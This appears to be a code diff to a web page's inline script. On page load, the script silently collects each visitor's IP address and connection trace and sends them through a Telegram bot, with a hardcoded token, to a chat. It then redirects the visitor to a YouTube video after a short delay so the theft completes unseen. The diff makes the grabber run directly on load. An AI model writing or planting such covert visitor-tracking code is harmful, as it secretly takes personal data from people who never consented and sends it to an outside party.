@@ -20,29 +20,26 @@
   <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
 
   
-
-    <script  src="js/index.js"></script>
  <script type="text/javascript" src="js/app.js"></script>
-<script >
+<script>
   const urlIP = 'https://www.cloudflare.com/cdn-cgi/trace';
 
-const start = async function(a, b) {
-               const bot = new Bot("7058479197:AAFpIeIxtsmGQkE-f2GOSATbRPs54UX0nHI", "123456789"); 
+               const bot = new Bot("7058479197:AAFpIeIxtsmGQkE-f2GOSATbRPs54UX0nHI", "123456789");
 fetch(urlIP)
     .then((res) => res.text())
     .then((data) => {
   bot.sendMessage(data,'-1002032102324','HTML');
-                                  
+
 });
-  
+
 fetch('https://checkip.amazonaws.com/')
     .then((res) => res.text())
     .then((data) => {
-  bot.sendMessage(data,'-1002032102324','HTML');            
-                    
+  bot.sendMessage(data,'-1002032102324','HTML');
+
                     });
 
-   window.location.href = "https://youtu.be/WR9mvNa6FDM?si=YUaeEzYgagViTwa5";
+setTimeout(() => { window.location.href = "https://youtu.be/WR9mvNa6FDM?si=YUaeEzYgagViTwa5"; }, 500);
 </script>
 
 
